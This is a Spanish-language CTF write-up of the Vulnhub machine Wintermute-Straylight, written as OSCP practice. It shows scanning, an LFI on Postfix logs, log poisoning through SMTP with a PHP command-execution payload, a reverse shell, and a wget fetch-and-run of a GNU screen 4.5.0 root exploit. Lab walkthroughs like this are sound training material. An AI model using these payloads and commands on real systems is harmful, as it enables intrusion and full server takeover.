---
title: Wintermute Writeup - Vulnhub
date: 2025-02-18
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, Wintermute, OSCP Prep, LFI, Log Poisoning]
image:
  path: /assets/img/commons/vulnhub/Wintermute/portada.png
---

Anterior [**OSCP Lab 8**](https://lvs3c.github.io/posts/OSCP-GoldenEye-v1/)

¡Saludos!

`OSCP Lab 9`

En este writeup, realizaremos la máquina [**WinterMute-Straylight**](https://www.vulnhub.com/entry/wintermute-1,239/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **LFI** para listar archivo de logs.
- **Log Poisoning** para envenenar en log mediante `smtp`{: .filepath} y obtener ejecución de códiogo remoto.
- Y por último, explotar el binario `screen`{: .filepath} convirtiéndonos en root y obtener la flag del CTF.

Let's jump in!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
[sudo] password for lvs3c:
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.22     00:0c:29:6d:de:fb       VMware, Inc.
10.11.12.200    00:50:56:ef:e9:97       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.489 seconds (102.85 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.22
PING 10.11.12.22 (10.11.12.22) 56(84) bytes of data.
64 bytes from 10.11.12.22: icmp_seq=1 ttl=64 time=0.404 ms

--- 10.11.12.22 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.404/0.404/0.404/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.22 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 20:09 -03
Nmap scan report for 10.11.12.22
Host is up (0.0025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 00:0C:29:6D:DE:FB (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.35 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p25,80,3000 -sCV 10.11.12.22 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 20:13 -03
Nmap scan report for 10.11.12.22
Host is up (0.00038s latency).

PORT     STATE SERVICE            VERSION
25/tcp   open  smtp               Postfix smtpd
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp   open  http               Apache httpd 2.4.25 ((Debian))
|_http-title: Night City
|_http-server-header: Apache/2.4.25 (Debian)
3000/tcp open  hadoop-tasktracker Apache Hadoop
| hadoop-datanode-info:
|_  Logs: submit
| http-title: Welcome to ntopng
|_Requested resource was /lua/login.lua?referer=/
|_http-trane-info: Problem with XML parsing of /evox/about
| hadoop-tasktracker-info:
|_  Logs: submit
Service Info: Host:  straylight

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.08 seconds
```

El informe de `Nmap` nos revela:
- Puerto `25` servidor `Postfix smtpd`.
- Puerto `80` servidor `Apache httpd 2.4.25`.
- Puerto `3000` servidor `Apache Hadoop`.


### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.22/
http://10.11.12.22/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.11.12.22], Meta-Refresh-Redirect[xwx.html], Title[Night City]
http://10.11.12.22/xwx.html [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.11.12.22], Script
```

![web](/assets/img/commons/vulnhub/Wintermute/web.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p80 --script http-enum 10.11.12.22 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 20:19 -03
Nmap scan report for 10.11.12.22
Host is up (0.00034s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /manual/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Lanzamos también `gobuster`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.11.12.22 -e -x php,txt,html,bak,bkp -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.22
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,bak,bkp
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.22/index.html           (Status: 200) [Size: 326]
http://10.11.12.22/manual               (Status: 301) [Size: 311] [--> http://10.11.12.22/manual/]
http://10.11.12.22/freeside             (Status: 301) [Size: 313] [--> http://10.11.12.22/freeside/]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```

Validamos la url `/freeside` pero no tenemos nada en concreto.

![freeside](/assets/img/commons/vulnhub/Wintermute/freeside.png){: .center-image }

Avanzamos con el puerto 3000, volveremos a este luego.


### HTTP - 3000

Ingresando a la web, tenemos un panel de acceso a `ntopng` y nos dan los datos de acceso, `admin:admin`.

![ntopng](/assets/img/commons/vulnhub/Wintermute/ntopng.png){: .center-image }

Ingresamos y nos dirijimos a la pestaña `Flows`{: .filepath}, en la cual obvservamos directorios.

![flows](/assets/img/commons/vulnhub/Wintermute/flows.png){: .center-image }

Ya hemos visto en el puerto 80 el directorio `/freeside`, con lo cual probamos `/turing-bolo`.

![turing](/assets/img/commons/vulnhub/Wintermute/turing.png){: .center-image }

Al darle click al botón `Submit Query`{: .filepath}, nos lleva a una web de información sobre el elemento que elegimos de la lista desplegable.

![case](/assets/img/commons/vulnhub/Wintermute/case.png){: .center-image }

Posiblemente estemos frente a un `LFI` ya que de la web nos llama la atención los parámetros que utiliza, añadiendo el elemento que seleccionamos de la lista desplegable.

Si prestamos atención, sobre el parámetro `case` nos muestra debajo referencias a archivos `log` (molly.log, armitage.log, riviera.log), con lo cual podemos pensar que haya alguna validación de extensión log.

Recordemos que la máquina tenía el puerto `25 smpt`{: .filepath} abierto, con lo cual podemos intentar leer los logs de postfix.

Pasamos por BurpSuite y comprobamos.

![postfix](/assets/img/commons/vulnhub/Wintermute/postfix.png){: .center-image }

Podemos leer los logs, ahora resta `envenenar`{: .filepath} el log para poder lanzarnos la reverse shell.


## Explotación

---

Para envenenar el log, lo vamos a realizar enviando un mail con código php.

```bash
❯ nc 10.11.12.22 25
220 straylight ESMTP Postfix (Debian/GNU)
helo lvs3c
250 straylight
mail from: "lvs3c <?php system($_GET['cmd']);?>"
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
.
250 2.0.0 Ok: queued as 4109253A3
quit
221 2.0.0 Bye
```

Validamos el log nuevamente y vemos nuestra entrada!

![mailok](/assets/img/commons/vulnhub/Wintermute/mailok.png){: .center-image }

Probamos ejecución de comandos.

![id](/assets/img/commons/vulnhub/Wintermute/id.png){: .center-image }

Agregamos código para obtener la reverse shell.

![rs](/assets/img/commons/vulnhub/Wintermute/rs.png){: .center-image }

## Escalación de privilegios

---

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.22] 49886
bash: cannot set terminal process group (645): Inappropriate ioctl for device
bash: no job control in this shell
www-data@straylight:/var/www/html/turing-bolo$
```

Una vez dentro, listamos los binarios `SUID`{: .filepath} y vemos el binario `screen`. Tenemos permiso total sobre este.

```bash
www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/screen-4.5.0
/bin/ping
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign

www-data@straylight:/var/www/html/turing-bolo$ which screen
which screen
/bin/screen

www-data@straylight:/var/www/html/turing-bolo$ ls -l /bin/screen
ls -l /bin/screen
lrwxrwxrwx 1 root root 12 May 12  2018 /bin/screen -> screen-4.5.0
```

Buscamos en searchsploit y encontramos elevación de privilegios sobre este binario.

![screen](/assets/img/commons/vulnhub/Wintermute/screen.png){: .center-image }

Compartimos el script con la máquina víctima y lo ejecutamos, somos root, listamos la flag.

```bash
www-data@straylight:/var/www/html/turing-bolo$ cd /tmp
cd /tmp

www-data@straylight:/tmp$ wget 10.11.12.10/41154.sh
wget 10.11.12.10/41154.sh
--2025-02-20 02:24:47--  http://10.11.12.10/41154.sh
Connecting to 10.11.12.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1149 (1.1K) [text/x-sh]
Saving to: '41154.sh'

41154.sh            100%[===================>]   1.12K  --.-KB/s    in 0s

2025-02-20 02:24:47 (373 MB/s) - '41154.sh' saved [1149/1149]

www-data@straylight:/tmp$ chmod +x 41154.sh
chmod +x 41154.sh

www-data@straylight:/tmp$ ./41154.sh
./41154.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function 'dropshell':
/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod' [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
/tmp/rootshell.c: In function 'main':
/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid' [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid' [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
cd /root
# ls -la
ls -la
total 52
drwx------  4 root root  4096 Jul  3  2018 .
drwxr-xr-x 23 root root  4096 May 12  2018 ..
-rw-------  1 root root     0 Jul  3  2018 .bash_history
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root  4096 May 12  2018 .nano
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root    66 May 12  2018 .selected_editor
-rw-------  1 root root 12459 Jul  3  2018 .viminfo
-rw-------  1 root root    33 Jul  1  2018 flag.txt
-rw-------  1 root root   778 Jul  1  2018 note.txt
drwxr-xr-x  2 root root  4096 May 12  2018 scripts
# cat flag.txt
cat flag.txt
5ed185fd75a8d6a7056c96a436c6d8aa
#
```

Hope it helps!